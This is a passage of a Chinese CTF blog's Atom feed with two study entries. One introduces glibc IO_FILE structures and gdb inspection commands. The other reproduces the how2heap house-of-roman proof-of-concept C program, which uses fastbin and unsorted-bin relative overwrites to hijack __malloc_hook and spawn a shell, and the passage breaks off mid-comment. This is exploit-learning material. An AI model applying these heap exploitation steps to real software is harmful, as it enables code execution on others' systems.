<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iyheart的博客</title>
  
  <subtitle>分享笔记和学习历程</subtitle>
  <link href="http://iyheart.github.io/atom.xml" rel="self"/>
  
  <link href="http://iyheart.github.io/"/>
  <updated>2025-03-27T17:24:01.960Z</updated>
  <id>http://iyheart.github.io/</id>
  
  <author>
    <name>iyheart</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PWN堆IO_FILE基础</title>
    <link href="http://iyheart.github.io/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86IO-FILE%E5%9F%BA%E7%A1%80/"/>
    <id>http://iyheart.github.io/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86IO-FILE%E5%9F%BA%E7%A1%80/</id>
    <published>2025-03-28T14:28:15.000Z</published>
    <updated>2025-03-27T17:24:01.960Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：<a href="https://bbs.kanxue.com/thread-275968.htm">[原创]无路远征——GLIBC2.37后时代的IO攻击之道（零）-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></li><li>参考博客：<a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">关于gdb源码调试环境搭建 - ZikH26 - 博客园</a></li><li><code>IO</code>也就是输入输出的意思，但是<code>C</code>语言的输入输出的函数有很多，例如：<code>puts</code>、<code>printf</code>、<code>write</code>、<code>stdin</code>、<code>stdout</code>、<code>scanf</code>、<code>read</code>等与输入输出相关的函数。</li><li><p>而我们所说的打<code>IO</code>打的是我们封装到比较上层的函数，比如<code>puts</code>、<code>printf</code>这类的上层封装的函数。</p><ul><li><code>read</code>、<code>write</code>这两个是比较底层的，系统调用<code>syscall</code>的输入输出，一般都是调用这两个函数。</li><li><code>puts</code>、<code>printf</code>等这些<code>IO</code>函数最后都会通过<code>write</code>这个底层函数与操作系统交互。</li><li>所以我们所说的打<code>IO</code>，打的就是这种上层输入输出函数。在调用这些函数的时候会经过一些<code>指针</code>、<code>结构体</code>、<code>函数指针</code>等，所以我们通过劫持<code>指针</code>、<code>伪造IO结构体</code>、<code>绕过检查机制</code>从而<code>getshll</code>或者执行<code>shellcode</code>。      </li><li>与<code>IO</code>相关的都可以在<code>glibc</code>源码中，<code>/path/to/glibc2.23/libio</code>中可以看到。</li></ul></li><li><p>由于高版本的<code>glibc</code>中<code>hook</code>指针被删除了，所以余下可用的函数指针只有<code>io</code>相关的函数指针了，在高版本堆利用的时候<code>IO</code>利用就成了基础了。</p></li></ul><h1 id="io_file起源及结构体"><a href="#IO-FILE起源及结构体" class="headerlink" title="IO_FILE起源及结构体"></a>IO_FILE起源及结构体</h1><ul><li>如果出过<code>pwn</code>题或者做过<code>全缓冲</code>的<code>pwn</code>题就会了解到这个函数。和缓冲区的三种工作模式，<code>无缓冲</code>、<code>行缓冲</code>、<code>全缓冲</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li>为什么要设置这三种模式，这就和<code>硬件</code>、<code>操作系统</code>、<code>程序</code>三者有关。首先程序要读写硬盘或者是输出到屏幕中，这些都是要通过系统调用<code>syscall</code>，进行<code>write</code>、<code>read</code>系统调用。</li><li>而何时进行系统调用，这就成为了设计<code>IO</code>的一个重要问题。如果每一个字节都需要使用<code>syscall</code>系统调用（即无缓冲模式）。向硬件进行读写操作，这就会大大降级操作系统的效率，并且硬件频繁读写也会造成更快的损坏。</li><li>为了减少这种情况，在设计<code>IO</code>的时候就会出现导致，设置了<code>缓冲区</code>，要输入的数据或者要输出的数据都会先被放入缓冲区，直到缓冲区满了之后，再进行系统调用，将缓冲区存储的内容写入到屏幕或者其他硬件中（全缓冲），以便提高操作系统的效率，提高硬件的使用寿命，这也就出现了现在的<code>IO_FILE</code>结构体。</li><li>接下来总结一下<code>glibc</code>封装的上层函数中与输入输出相关的函数，对于<code>IO</code>的攻击一般就攻击这些<code>IO</code>函数的结构体``。<ul><li>标准输入函数<ul><li><code>gets()</code>、<code>fgets()</code>、<code>scanf()</code>、<code>fscanf()</code>、<code>sscanf()</code>、<code>getc()</code>、<code>fgetc()</code>、<code>getchar()</code>、<code>getline()</code>、<code>getdelim()</code></li></ul></li><li>标准输出函数<ul><li><code>printf()</code>、<code>fprintf()</code>、<code>sprintf()</code>、<code>snprintf()</code>、<code>putc()</code>、<code>fputc()</code>、<code>putchar()</code>、<code>puts()</code></li></ul></li><li>文件操作函数：<ul><li><code>fopen()</code>、<code>freopen()</code>、<code>fdopen()</code>、<code>fclose()</code>、<code>fflush()</code>、<code>setbuf()</code>、<code>setvbuf()</code>、<code>fread()</code>、<code>fwrite()</code>、<code>fseek()</code>、<code>ftell()</code>、<code>fewind()</code>、<code>rewind()</code></li></ul></li><li>格式化字符串相关函数：<ul><li><code>printf()</code>、<code>fprintf()</code>、<code>sprintf()</code>、<code>snprintf()</code>、<code>vprintf()</code>、<code>vfprintf()</code>、<code>vsprintf()</code>、<code>vsnprintf()</code></li></ul></li><li>其他相关函数：<ul><li><code>perror()</code>、<code>tmpfile()</code>、<code>clearerr()</code>、<code>feof()</code>、<code>ferror()</code>、<code>stdout</code>、<code>stdout()</code>、<code>stdin()</code>、<code>stderror()</code></li></ul></li></ul></li></ul><h1 id="io_file相关动调"><a href="#IO-FILE相关动调" class="headerlink" title="IO_FILE相关动调"></a>IO_FILE相关动调</h1><ul><li><p>写介绍几个比较重要的<code>IO</code>结构体，并且说明这写结构体在<code>glibc2.23</code>源码的什么位置。</p></li><li><p>这里先汇总一下与<code>IO_FILE</code>相关动调命令，与<code>IO_FILE</code>相关的调试基本上就是打印结构体。可以在<code>gdb</code>中使用<code>p</code>命令打印出结构体的具体存储的值</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p stdout</span><br><span class="line">p _IO_2_1_stdout_</span><br><span class="line">p _IO_file_jumps</span><br><span class="line">p *(struct _IO_FILE *) _IO_list_all</span><br></pre></td></tr></table></figure><ul><li>接下来调试几个上层的输出函数。来对<code>IO</code>调用有个总体了解。</li></ul><h1 id="io_file相关源码"><a href="#IO-FILE相关源码" class="headerlink" title="IO_FILE相关源码"></a>IO_FILE相关源码</h1><h1 id="io_file基础"><a href="#IO-FILE基础" class="headerlink" title="IO_FILE基础"></a>IO_FILE基础</h1>]]></content>
    
    
    <summary type="html">前言：终于到IO了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-roman</title>
    <link href="http://iyheart.github.io/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/"/>
    <id>http://iyheart.github.io/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/</id>
    <published>2025-03-28T00:43:36.000Z</published>
    <updated>2025-03-27T17:41:48.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li>前置知识的话基本上都学了，这边就大概书写一下。<ul><li><code>fastbin</code>的运行机制</li><li><code>unsorted_bin</code>的运行机制</li><li><code>fastbin_attack</code></li><li><code>unsorted_bin_attack</code></li><li><code>malloc_hook</code>等<code>hook</code>技术</li></ul></li></ul><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><ul><li>接下来直接进行实验还是老样子，翻译源码。</li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">&quot;/bin/sh\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.</span></span><br><span class="line"><span class="comment">Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment">POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this in order to turn off printf buffering (messes with heap alignment)</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">The main goal of this technique is to create a **leakless** heap </span></span><br><span class="line"><span class="comment">exploitation technique in order to get a shell. This is mainly </span></span><br><span class="line"><span class="comment">done using **relative overwrites** in order to get pointers in </span></span><br><span class="line"><span class="comment">the proper locations without knowing the exact value of the pointer.</span></span><br><span class="line"><span class="comment">The first step is to get a pointer inside of __malloc_hook. This </span></span><br><span class="line"><span class="comment">is done by creating a fastbin bin that looks like the following: </span></span><br><span class="line"><span class="comment">ptr_to_chunk -&gt; ptr_to_libc. Then, we alter the ptr_to_libc</span></span><br><span class="line"><span class="comment"> (with a relative overwrite) to point to __malloc_hook. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The next step is to run an unsorted bin attack on the __malloc_hook </span></span><br><span class="line"><span class="comment">(which is now controllable from the previous attack).  Again, we run </span></span><br><span class="line"><span class="comment">the unsorted_bin attack by altering the chunk-&gt;bk with a relative overwrite. </span></span><br><span class="line"><span class="comment">Finally, after launching the unsorted_bin attack to put a libc value </span></span><br><span class="line"><span class="comment">inside of __malloc_hook, we use another relative overwrite on the </span></span><br><span class="line"><span class="comment">value of __malloc_hook to point to a one_gadget, system or some other function.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Now, the next time we run malloc we pop a shell! :) </span></span><br><span class="line"><span class="comment">However, this does come at a cost: 12 bits of randomness must be </span></span><br><span class="line"><span class="comment">brute forced (0.02% chance) of working.</span></span><br><span class="line"><span class="comment">The original write up for the *House of Roman* can be found at</span></span><br><span class="line"><span class="comment"> https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.</span></span><br><span class="line"><span class="comment">This technique requires the ability to edit fastbin and unsorted bin </span></span><br><span class="line"><span class="comment">pointers via UAF or overflow of some kind. Additionally, good control </span></span><br><span class="line"><span class="comment">over the allocations sizes and freeing is required for this technique.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* introduction = <span class="string">&quot;\nWelcome to the House of Roman\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;This is a heap exploitation technique that is LEAKLESS.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;There are three stages to the attack: \n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;1. Point a fastbin chunk to __malloc_hook.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;2. Run the unsorted_bin attack on __malloc_hook.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;3. Relative overwrite on main_arena at __malloc_hook.\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;All of the stuff mentioned above is done using two main concepts:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;relative overwrites and heap feng shui.\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;However, this technique comes at a cost:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;12-bits of entropy need to be brute forced.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;That means this technique only work 1 out of every 4096 tries or 0.02%.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(introduction);</span><br><span class="line">init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Part 1: Fastbin Chunk points to __malloc_hook</span></span><br><span class="line"><span class="comment">Getting the main_arena in a fastbin chunk ordering is the first step.</span></span><br><span class="line"><span class="comment">This requires a ton of heap feng shui in order to line this up properly. </span></span><br><span class="line"><span class="comment">However, at a glance, it looks like the following:</span></span><br><span class="line"><span class="comment">First, we need to get a chunk that is in the fastbin with a pointer to</span></span><br><span class="line"><span class="comment">a heap chunk in the fd. </span></span><br><span class="line"><span class="comment">Second, we point this chunk to a pointer to LibC (in another heap chunk). </span></span><br><span class="line"><span class="comment">All of the setup below is in order to get the configuration mentioned </span></span><br><span class="line"><span class="comment">above setup to perform the relative overwrites. &quot;;</span></span><br><span class="line"><span class="comment">Getting the pointer to libC can be done in two ways: </span></span><br><span class="line"><span class="comment">- A split from a chunk in the small/large/unsorted_bins </span></span><br><span class="line"><span class="comment">gets allocated to a size of 0x70. </span></span><br><span class="line"><span class="comment">- Overwrite the size of a small/large chunk used previously to 0x71.</span></span><br><span class="line"><span class="comment">For the sake of example, this uses the first option because it </span></span><br><span class="line"><span class="comment">requires less vulnerabilities.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 1: Point fastbin chunk to __malloc_hook\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Setting up chunks for relative overwrites with heap feng shui.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.</span></span><br><span class="line"><span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate this in order to have good alignment for relative </span></span><br><span class="line"><span class="comment">// offsets later (only want to overwrite a single byte to prevent </span></span><br><span class="line"><span class="comment">// 4 bits of brute on the heap).</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x100</span></span><br><span class="line"><span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x190</span></span><br><span class="line"><span class="comment">// This ptr will be used for a relative offset on the &#x27;main_arena_use&#x27; chunk</span></span><br><span class="line"><span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Free the chunk to put it into the unsorted_bin. </span></span><br><span class="line"><span class="comment">// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.</span></span><br><span class="line"><span class="built_in">free</span>(main_arena_use);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Get part of the unsorted_bin chunk (the one that we just freed). </span></span><br><span class="line"><span class="comment">We want this chunk because the fd and bk of this chunk will </span></span><br><span class="line"><span class="comment">contain main_arena ptrs (used for relative overwrite later).</span></span><br><span class="line"><span class="comment">The size is particularly set at 0x60 to put this into the 0x70 fastbin later. </span></span><br><span class="line"><span class="comment">This has to be the same size because the __malloc_hook fake </span></span><br><span class="line"><span class="comment">chunk (used later) uses the fastbin size of 0x7f. There is</span></span><br><span class="line"><span class="comment"> a security check (within malloc) that the size of the chunk matches the fastbin size.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n&quot;</span>);</span><br><span class="line"><span class="comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span></span><br><span class="line"><span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//// <span class="doctag">NOTE:</span> This is NOT part of the exploit... \\\</span></span><br><span class="line"><span class="comment">// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. </span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - <span class="number">0xe8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// We need the filler because the overwrite below needs </span></span><br><span class="line"><span class="comment">// to have a ptr in the fd slot in order to work. </span></span><br><span class="line"><span class="comment">//Freeing this chunk puts a chunk in the fd slot of &#x27;fastbin_victim&#x27; to be used later. </span></span><br><span class="line"><span class="built_in">free</span>(relative_offset_heap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    Create a UAF on the chunk. Recall that the chunk that fastbin_victim </span></span><br><span class="line"><span class="comment">points to is currently at the offset 0x190 (heap_relative_offset).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="built_in">free</span>(fastbin_victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Now, we start doing the relative overwrites, since that we have </span></span><br><span class="line"><span class="comment">the pointers in their proper locations. The layout is very important to </span></span><br><span class="line"><span class="comment">understand for this.</span></span><br><span class="line"><span class="comment">Current heap layout: </span></span><br><span class="line"><span class="comment">0x0:   fastbin_victim       - size 0x70 </span></span><br><span class="line"><span class="comment">0x70:  alignment_filler     - size 0x90</span></span><br><span class="line"><span class="comment">0x100: fake_libc_chunk      - size 0x70</span></span><br><span class="line"><span class="comment">0x170: leftover_main        - size 0x20</span></span><br><span class="line"><span class="comment">0x190: relative_offset_heap - size 0x70 </span></span><br><span class="line"><span class="comment">bin layout: </span></span><br><span class="line"><span class="comment">fastbin:  fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">unsorted: leftover_main</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Now, the relative overwriting begins:</span></span><br><span class="line"><span class="comment">Recall that fastbin_victim points to relative_offset_heap </span></span><br><span class="line"><span class="comment">(which is in the 0x100-0x200 offset range). The fastbin uses a singly </span></span><br><span class="line"><span class="comment">linked list, with the next chunk in the &#x27;fd&#x27; slot.</span></span><br><span class="line"><span class="comment">By *partially* editing the fastbin_victim&#x27;s last byte (from 0x90 </span></span><br><span class="line"><span class="comment">to 0x00) we have moved the fd pointer of fastbin_victim to </span></span><br><span class="line"><span class="comment">fake_libc_chunk (at offset 0x100).</span></span><br><span class="line"><span class="comment">Also, recall that fake_libc_chunk had previously been in the unsorted_bin. </span></span><br><span class="line"><span class="comment">Because of this, it has a fd pointer that points to main_arena + 0x68. </span></span><br><span class="line"><span class="comment">Now, the fastbin looks like the following: </span></span><br><span class="line"><span class="comment">fastbin_victim -&gt; fake_libc_chunk -&gt;(main_arena + 0x68).</span></span><br><span class="line"><span class="comment">The relative overwrites (mentioned above) will be demonstrates step by step below.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\</span></span><br><span class="line"><span class="string">to the chunk with the LibC address\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fastbin 0x70 now looks like this:\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;</span>);</span><br><span class="line">fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Now, we have a fastbin that looks like the following: </span></span><br><span class="line"><span class="comment">0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (main_arena + 0x68)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">We want the fd ptr in fake_libc_chunk to point to something 